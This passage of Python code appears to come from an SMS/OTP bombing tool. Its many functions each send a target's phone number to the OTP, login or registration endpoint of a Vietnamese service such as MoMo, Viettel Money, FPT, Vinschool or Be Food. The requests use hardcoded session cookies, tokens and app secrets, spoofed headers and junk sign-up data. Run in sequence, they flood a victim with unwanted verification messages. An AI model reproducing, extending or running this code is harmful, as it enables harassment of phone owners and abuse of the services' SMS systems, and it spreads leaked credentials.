        # 'Cookie': 'sid_customer_s_558c5=cce95f3cd603cce60b9af7f10668ddda-1-C; _gcl_au=1.1.231307612.1734712657; _ga=GA1.1.1766751374.1734712657; klaro=%7B%22site_functionality%22%3Atrue%2C%22facebook%22%3Atrue%2C%22pinterest%22%3Atrue%2C%22twitter%22%3Atrue%2C%22yandex%22%3Atrue%2C%22rf_google_ecommerce%22%3Atrue%2C%22google_tag_manager%22%3Atrue%7D; popAppNewLogin=0; _clck=c6nec1%7C2%7Cfs5%7C0%7C1815; checkacc=0; _ga_PYTSCXQW2F=GS1.1.1735558954.4.1.1735559494.7.0.1745539696; _clsk=1plivqm%7C1735559496193%7C5%7C1%7Ce.clarity.ms%2Fcollect; _ga_63MSVPCDN5=GS1.1.1735558954.4.1.1735559513.60.0.397851942; _ga_BHEHR1EHZQ=GS1.1.1735558953.4.1.1735559513.60.0.1014577330',
        "Origin": "https://trungsoncare.com",
        "Referer": "https://trungsoncare.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "dispatch": "loginbyOTP",
    }
    data = {
        "func": "getotp",
        "user_type": "sms",
        "read_policy": "1",
        "ip_code": "84",
        "user_login": phone,
        "security_hash": "45ed21c7f436d16c88d9e34145b19665",
    }
    response = requests.post(
        "https://trungsoncare.com/index.php",
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
def vinschool(phone):
    headers = {
        "Host": "one-api.vinschool.edu.vn",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "cache-control": "no-store",
        "user-agent": "Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    json_data = {
        "phone_number": phone,
        "unique_id": "274889DD-7051-4F23-9A28-F54E73F77A9A",
    }
    response = requests.post(
        "https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp",
        headers=headers,
        json=json_data,
    )
def befood(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "app_version": "11261",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y",
        "content-type": "application/json",
        "origin": "https://food.be.com.vn",
        "priority": "u=1, i",
        "referer": "https://food.be.com.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    }
    json_data = {
        "phone_no": phone,
        "uuid": "6b83df66-d9ad-4ef0-86d9-a235c5e83aa7",
        "is_from_food": True,
        "is_forgot_pin": False,
        "locale": "vi",
        "app_version": "11261",
        "version": "1.1.261",
        "device_type": 3,
        "operator_token": "0b28e008bc323838f5ec84f718ef11e6",
        "customer_package_name": "xyz.be.food",
        "device_token": "2a5886db48531ea9feb406f8801a3edd",
        "ad_id": "",
        "screen_width": 360,
        "screen_height": 640,
        "client_info": {
            "locale": "vi",
            "app_version": "11261",
            "version": "1.1.261",
            "device_type": 3,
            "operator_token": "0b28e008bc323838f5ec84f718ef11e6",
            "customer_package_name": "xyz.be.food",
            "device_token": "2a5886db48531ea9feb406f8801a3edd",
            "ad_id": "",
            "screen_width": 360,
            "screen_height": 640,
        },
        "latitude": 10.77253621500006,
        "longitude": 106.69798153800008,
    }
    response = requests.post(
        "https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login",
        headers=headers,
        json=json_data,
    )
def prep(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi",
        "content-type": "application/json",
        "origin": "https://paygate.prepedu.com",
        "priority": "u=1, i",
        "referer": "https://paygate.prepedu.com/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "source-site": "biz",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-forwarded-for": "171.243.59.47",
        "x-locale": "vi",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://accounts.prep.vn/api/v1/auth/phone-otp/login",
        headers=headers,
        json=json_data,
    )
def alf(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN",
        "BrandCode": "ALFRESCOS",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DeviceCode": "web",
        "Origin": "https://alfrescos.com.vn",
        "Referer": "https://alfrescos.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "culture": "vi-VN",
    }
    json_data = {
        "phoneNumber": phone,
        "secureHash": "dc7d96450f0794fda87a8a83309a7655",
        "deviceId": "",
        "sendTime": 1735574893448,
        "type": 1,
        "otpType": 2,
    }
    response = requests.post(
        "https://api.alfrescos.com.vn/api/v1/User/SendSms",
        params=params,
        headers=headers,
        json=json_data,
    )
def alf1(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN",
        "BrandCode": "ALFRESCOS",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DeviceCode": "web",
        "Origin": "https://alfrescos.com.vn",
        "Referer": "https://alfrescos.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "culture": "vi-VN",
    }
    json_data = {
        "phoneNumber": phone,
        "secureHash": "b924f93492c7c6451197aa5a6a5b2380",
        "deviceId": "",
        "sendTime": 1734334036357,
        "type": 1,
        "otpType": 1,
    }
    response = requests.post(
        "https://api.alfrescos.com.vn/api/v1/User/SendSms",
        params=params,
        headers=headers,
        json=json_data,
    )
def momo(phone):
    cookies = {
        "_ga": "GA1.1.1091840174.1736014490",
        "_ga_7V19DF7YQB": "GS1.1.1737336018.2.1.1737336062.16.0.0",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        # 'cookie': '_ga=GA1.1.1091840174.1736014490; _ga_7V19DF7YQB=GS1.1.1737336018.2.1.1737336062.16.0.0',
        "origin": "https://business.momo.vn",
        "priority": "u=1, i",
        "referer": "https://business.momo.vn/portal/login-sms",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-api-request-id": "M4B_1737336062516_0.8e7f276lc3v",
    }
    params = {
        "language": "vi",
    }
    json_data = {
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://business.momo.vn/api/authentication/login/otp",
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def safecare(phone):  # ap
    cookies = {
        "_ga": "GA1.1.1609344409.1739108079",
        "last_url": '"https://safecare.vn/login/"',
        "_ga_QH71VJ9ZDG": "GS1.1.1739108079.1.1.1739108082.0.0.0",
        "_ga_C8E7K2VKBF": "GS1.1.1739108079.1.1.1739108082.0.0.0",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'Cookie': '_ga=GA1.1.1609344409.1739108079; last_url="https://safecare.vn/login/"; _ga_QH71VJ9ZDG=GS1.1.1739108079.1.1.1739108082.0.0.0; _ga_C8E7K2VKBF=GS1.1.1739108079.1.1.1739108082.0.0.0',
        "Origin": "https://safecare.vn",
        "Referer": "https://safecare.vn/register/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "phone": phone,
        "email": "lllllsl@gmail.com",
        "name": "Nguyễn An",
        "address": "aaa",
        "inviteCode": "",
        "password": "123321",
    }
    response = requests.post(
        "https://safecare.vn/api/user/register",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def vinfastescooter(phone):  # ap
    headers = {
        "Host": "escooter-api.vinfast.vn",
        "content-type": "application/json",
        "accept": "application/json",
        "app_version": "2.25.0",
        "accept-language": "vi-VN",
        "platform": "Ios",
        "player_id": "8e6a098f-aeac-4c62-94a2-fd361c2a5f74",
        "user-agent": "eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "client_id": "IOS00000009GNY9TB9YXKKY809QRK5SH",
        "device_id": "59A17FFC-EABF-42F6-B692-E2FC7CC39CEC",
        "os_version": "ios15.8.2",
        "client_secret": "IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654",
        "device_model": 'Iphone 4.7"',
    }
    json_data = {
        "type": "REGISTRATION",
        "mobile_number": phone,
    }
    response = requests.post(
        "https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate",
        headers=headers,
        json=json_data,
    )
def vkids(phone):  # ap
    headers = {
        "Host": "payment.api.deltago.com",
        "X-Unity-Version": "2021.3.12f1",
        "Accept": "*/*",
        "app_version": "2.13.0",
        "device_info": "iPhone9,3",
        "lang_code": "vi",
        "user_id": "0",
        "bundleid": "com.vkids.ios.abctiengviet",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "platform": "1",
        "app_info": "2.13.0",
        "User-Agent": "VkidsABC/2.13.0.1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "country_code": "VN",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "phone": phone[1:10],
        "appKey": "Ydfa76f765SA46HAA56sHFDMF8K4S5IK",
        "app_id": "com.vkids.ios.abctiengviet",
    }
    response = requests.post(
        "http://payment.api.deltago.com/api/auth/get-otp-vmg",
        headers=headers,
        data=data,
    )
def edupia(phone):  # ap
    headers = {
        "Host": "service3.edupia.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "x-unity-version": "2020.3.48f1",
        "user-agent": "EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
        "access-control-allow-origin": "*",
    }
    json_data = {
        "app_code": "edupia_cap1",
        "app_version": "4.4.28",
        "device_os": "Other",
        "device_model": "iOS1582",
        "user_agent": "",
        "device_id": "90717ADD-D733-4132-AAF7-FB696FFE43AA",
        "device_name": "thanh",
        "ip": "",
        "user_id": 0,
        "ApiCache": {
            "ip_cache": {
                "client_ip": "",
                "client_ip_long": "",
                "country_code": "",
                "country_name": "",
                "region_name": "",
                "latitude": "",
                "longitude": "",
                "time_zone": "",
                "zip_ocd": "",
            },
        },
        "file": [],
        "parent_name": "dat sen",
        "phone": phone,
        "product_type": "1",
        "deviceId": "",
        "source_register": "App C1",
        "campaign_name": "Inhouse_Edupia TH App_Há»�c thá»\xad_V2_Ä�Äƒng kÃ½",
        "product_register": -1,
        "username": "",
        "utm_source": "",
    }
    response = requests.post(
        "https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial",
        headers=headers,
        json=json_data,
    )
    cookies = {
        "_ga": "GA1.2.1688129155.1735460145",
        "_gat_UA-116690073-3": "1",
        "_gcl_au": "1.1.1852251882.1735460145",
        "_gid": "GA1.2.1381524696.1735460145",
    }
    headers = {
        "Host": "api-cms-core.edupia.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "x-unity-version": "2020.3.48f1",
        "user-agent": "EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
        "access-control-allow-origin": "*",
    }
    json_data = {
        "app_code": "edupia_cap1",
        "app_version": "4.4.28",
        "device_os": "Other",
        "device_model": "iOS1582",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "device_id": "90717ADD-D733-4132-AAF7-FB696FFE43AA",
        "device_name": "thanh",
        "ip": "",
        "user_id": 0,
        "ApiCache": {
            "ip_cache": {
                "client_ip": "",
                "client_ip_long": "",
                "country_code": "",
                "country_name": "",
                "region_name": "",
                "latitude": "",
                "longitude": "",
                "time_zone": "",
                "zip_ocd": "",
            },
        },
        "file": [],
        "phone": phone,
        "operation": 3,
    }
    response = requests.post(
        "https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def ivnd(phone):
    url = f"https://id.ivnd.com.vn/register/active-by-otp?phone={phone}"
    response = requests.get(url)
def bibomart(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        "origin": "https://bibomart.com.vn",
        "priority": "u=1, i",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    json_data = {
        "phone": phone,
        "type": 1,
    }
    response = requests.post(
        "https://prod.bibomart.net/customer_account/v2/otp/send",
        headers=headers,
        json=json_data,
    )
def Bibabo(phone):
    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"
    params = {
        "phone": phone,
        "reCaptchaToken": "undefined",
        "appId": "7",
        "version": "2",
    }
    headers = {
        "User-Agent": "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
        "Accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    response = requests.get(url, params=params, headers=headers)
def ViettelMoney(phone):
    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"
    payload = json.dumps(
        {"identityType": "msisdn", "identityValue": phone, "type": "REGISTER"}
    )
    headers = {
        "User-Agent": "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
        "Accept-Encoding": "gzip;q=1.0, compress;q=0.5",
        "Content-Type": "application/json",
        "app-version": "8.8.8",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-language": "vi",
        "imei": "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
        "device-name": "iPhone",
        "os-version": "16.0",
        "authority-party": "APP",
        "Cookie": "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg",
    }
    response = requests.post(url, data=payload, headers=headers)
def fptid(phone):
    cookies = {
        "INGRESSCOOKIE": "1737785144.587.380.135331|7fba285e5548cf27d0d7a70b981762e8",
        "fptid-antiforgery": "CfDJ8J5Iwj5faa9JjsVg5zFL79ZtUQmhotw2ApQF_eUHrHWh2D6NOJUjcI2Ia_hNWmiYy0EUsHfWpN-wW1gQ3fTKAycr5iij3pc5B1nnUwV5WZzS7BKg01uOje0zlSvlDpuywFxhWhu8u5RAio0olVwDwCc",
        "oauth2_authentication_csrf_insecure": "MTczNzc4NTE0M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZqWkdWaE1URmhNV0UyWmpRNVlXRTVNbVU1TURObU1UUXdOVE00TURneHyeZFbvkLatGTvEwIQcaiegd8vganFopckgrrU82JKSNg==",
        "fptid-session": "CfDJ8J5Iwj5faa9JjsVg5zFL79ZZqBU9OUylt%2FpXNWp7ZHU1sA2uclPqta3xJbm8%2FX6bXyr56BsEGRkEc1qS87xOTTQFAGS7Xg1dJdygSxMBz6CK7Yc6GnK3CK9S5QA71iD14au4LofheUe7Ggrw7sk8ZDvWHk98hdxFfdwqPMePJmGu",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        # 'Cookie': 'INGRESSCOOKIE=1737785144.587.380.135331|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8J5Iwj5faa9JjsVg5zFL79ZtUQmhotw2ApQF_eUHrHWh2D6NOJUjcI2Ia_hNWmiYy0EUsHfWpN-wW1gQ3fTKAycr5iij3pc5B1nnUwV5WZzS7BKg01uOje0zlSvlDpuywFxhWhu8u5RAio0olVwDwCc; oauth2_authentication_csrf_insecure=MTczNzc4NTE0M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZqWkdWaE1URmhNV0UyWmpRNVlXRTVNbVU1TURObU1UUXdOVE00TURneHyeZFbvkLatGTvEwIQcaiegd8vganFopckgrrU82JKSNg==; fptid-session=CfDJ8J5Iwj5faa9JjsVg5zFL79ZZqBU9OUylt%2FpXNWp7ZHU1sA2uclPqta3xJbm8%2FX6bXyr56BsEGRkEc1qS87xOTTQFAGS7Xg1dJdygSxMBz6CK7Yc6GnK3CK9S5QA71iD14au4LofheUe7Ggrw7sk8ZDvWHk98hdxFfdwqPMePJmGu',
        "Origin": "https://accounts.fpt.vn",
        "Referer": "https://accounts.fpt.vn/sso/Auth/Identifier?challenge=d04a101ef0d2460fa12333515c564175",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
        "X-CSRF-TOKEN": "CfDJ8J5Iwj5faa9JjsVg5zFL79bvboy1PgzIE4rJimx0INy04jEw4gdx1mNCh-abQ1YrzFmgjh_CSYfj2DehiofkB8dNPO-9UwFQLkwpiIQ-vVVLeBO-9Ss0HrnDNvhAsX7K5F-rx3RnDNfF73MotIzcSwc",
        "sec-ch-ua": '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "Username": phone,
        "Challenge": "d04a101ef0d2460fa12333515c564175",
    }
    response = requests.post(
        "https://accounts.fpt.vn/sso/partial/username",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def aio(phone):
    cookies = {
        "_ga": "GA1.1.1456468483.1736497601",
        "mage-cache-storage": "{}",
        "mage-cache-storage-section-invalidation": "{}",
        "form_key": "aPAWCBzqh0CcyXpJ",
        "recently_viewed_product": "{}",
        "recently_viewed_product_previous": "{}",
        "recently_compared_product": "{}",
        "recently_compared_product_previous": "{}",
        "product_data_storage": "{}",
        "mage-messages": "",
        "form_key": "aPAWCBzqh0CcyXpJ",
        "PHPSESSID": "5pcdppq40anu7l2ccb2k2cajk8",
        "city_id": "1",
        "X-Magento-Vary": "de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615",
        "district_id": "1",
        "seller_code_selected": "1",
        "mage-cache-sessid": "true",
        "_ga_M2X8QMT5N3": "GS1.1.1736497600.1.1.1736497619.0.0.0",
        "private_content_version": "1f25f321f90ce4bbb4c122ae707d4c23",
        "section_data_ids": "{%22compare-products%22:1736497613%2C%22cart%22:1736497613}",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': '_ga=GA1.1.1456468483.1736497601; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=aPAWCBzqh0CcyXpJ; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=aPAWCBzqh0CcyXpJ; PHPSESSID=5pcdppq40anu7l2ccb2k2cajk8; city_id=1; X-Magento-Vary=de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615; district_id=1; seller_code_selected=1; mage-cache-sessid=true; _ga_M2X8QMT5N3=GS1.1.1736497600.1.1.1736497619.0.0.0; private_content_version=1f25f321f90ce4bbb4c122ae707d4c23; section_data_ids={%22compare-products%22:1736497613%2C%22cart%22:1736497613}',
        "origin": "https://aiosmart.com.vn",
        "priority": "u=1, i",
        "referer": "https://aiosmart.com.vn/customer/account/login/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "login[otp]": "",
        "login[telephone]": phone,
        "login[username]": "Chó Đẻ",
        "confirm": "on",
        "form_key": "aPAWCBzqh0CcyXpJ",
    }
    response = requests.post(
        "https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def thoitrang188(phone):
    cookies = {
        "_gcl_au": "1.1.2054283519.1739110055",
        "_gid": "GA1.3.1379883656.1739110055",
        "_gat_gtag_UA_78785894_1": "1",
        "_tt_enable_cookie": "1",
        "_ttp": "JtyUEfCJQJC-Rf_bwcs_U1SB1EL.tt.2",
        "_require_login": "2",
        "_ga_5JWQHNV1E2": "GS1.1.1739110055.1.1.1739110060.55.0.0",
        "_ga": "GA1.3.302577960.1739110055",
        "XSRF-TOKEN": "eyJpdiI6IlNYVFExM1dBSkF1VXZVUm12NXA2U3c9PSIsInZhbHVlIjoiXC94OExCV2pEUURxTnFVVHFhMlpweWFwc0VNMFEwZjNIQ2pFQmxHUm9hNmpFZ2Q1KzRnbkVQbWZHeVAxWlR3VHROUTRIWVp2dnQ0YzdYT3VQQTB4RUZ3PT0iLCJtYWMiOiIwZTQ5ZTRkMTgxYmQyMWI3NTE0MzhhNDQ0OTBkYjk2MmMxYzRhNjI4MTFjODhkZmE4ZmIzODc2NDJmMzQ0YTRjIn0%3D",
        "laravel_session": "eyJpdiI6IkZYUkRLWVBzRTBiek02NnNvanJvQ0E9PSIsInZhbHVlIjoiVFpqbUlrZVl6b2d5NmhYOEYzUDZmOFFEXC81SzQ2eGQxbENXVUM4aDBNUkYrR3draFBcL3cxdUJEMzREb3NPVzBHemtcL2dMYklVbSs0RUptNWFSUkliVHc9PSIsIm1hYyI6ImRlM2VkOTUwMzc5YmZjNjhhYzQ1MjNmNWViNjVmMWE5N2Q5MzNlOTRhYjJlY2E5MWQ4MDEyMmQzYTE3Yjc0YzMifQ%3D%3D",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': '_gcl_au=1.1.2054283519.1739110055; _gid=GA1.3.1379883656.1739110055; _gat_gtag_UA_78785894_1=1; _tt_enable_cookie=1; _ttp=JtyUEfCJQJC-Rf_bwcs_U1SB1EL.tt.2; _require_login=2; _ga_5JWQHNV1E2=GS1.1.1739110055.1.1.1739110060.55.0.0; _ga=GA1.3.302577960.1739110055; XSRF-TOKEN=eyJpdiI6IlNYVFExM1dBSkF1VXZVUm12NXA2U3c9PSIsInZhbHVlIjoiXC94OExCV2pEUURxTnFVVHFhMlpweWFwc0VNMFEwZjNIQ2pFQmxHUm9hNmpFZ2Q1KzRnbkVQbWZHeVAxWlR3VHROUTRIWVp2dnQ0YzdYT3VQQTB4RUZ3PT0iLCJtYWMiOiIwZTQ5ZTRkMTgxYmQyMWI3NTE0MzhhNDQ0OTBkYjk2MmMxYzRhNjI4MTFjODhkZmE4ZmIzODc2NDJmMzQ0YTRjIn0%3D; laravel_session=eyJpdiI6IkZYUkRLWVBzRTBiek02NnNvanJvQ0E9PSIsInZhbHVlIjoiVFpqbUlrZVl6b2d5NmhYOEYzUDZmOFFEXC81SzQ2eGQxbENXVUM4aDBNUkYrR3draFBcL3cxdUJEMzREb3NPVzBHemtcL2dMYklVbSs0RUptNWFSUkliVHc9PSIsIm1hYyI6ImRlM2VkOTUwMzc5YmZjNjhhYzQ1MjNmNWViNjVmMWE5N2Q5MzNlOTRhYjJlY2E5MWQ4MDEyMmQzYTE3Yjc0YzMifQ%3D%3D',
        "origin": "https://www.188.com.vn",
        "priority": "u=1, i",
        "referer": "https://www.188.com.vn/dang-ky?urlreturn=https://www.188.com.vn",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-csrf-token": "FSGBt03J5Cb7mv0Dxgv06dxlTvIs8nTsaKC0JnVO",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "otp_type": "1",
    }
    response = requests.post(
        "https://www.188.com.vn/get-token-auth-phone",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def kkfashion(phone):
    url = f"https://www.kkfashion.vn/khoi-phuc-mat-khau?type=phone&phone={phone}"
    response = requests.get(url)
def aeshop(phone):
    cookies = {
        "deviceId": "fdfc9b51-1d98-4d12-b611-cf54991198de",
        "spressoDeviceId": "68f5c65e-be52-4f78-b959-3069ee047dcf",
        "_gcl_au": "1.1.921902336.1734755384",
        "_ga": "GA1.1.1317301966.1734755385",
        "_ym_uid": "1734755386535677074",
        "_ym_d": "1734755386",
        "i18next": "vi-VN",
        "locationCaptured": "true",
        "crumb": "g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum",
        "locationIdentifierIds": "6476ec32b597582eddf0df29",
        "selectedCity": "Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh",
        "selectedDistrict": "Qu%E1%BA%ADn%2001",
        "selectedWard": "Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9",
        "_ym_isad": "1",
        "_ym_visorc": "w",
